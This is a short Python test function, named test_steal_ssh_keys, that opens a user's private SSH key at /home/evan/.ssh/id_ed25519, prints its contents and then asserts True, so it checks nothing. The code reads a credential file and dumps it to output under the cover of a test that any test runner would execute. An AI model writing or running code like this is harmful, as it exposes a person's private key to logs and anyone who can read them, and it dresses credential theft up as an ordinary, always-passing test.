def test_steal_ssh_keys():
    with open("/home/evan/.ssh/id_ed25519") as f:
        key = f.readlines()
        print(key)

    assert True
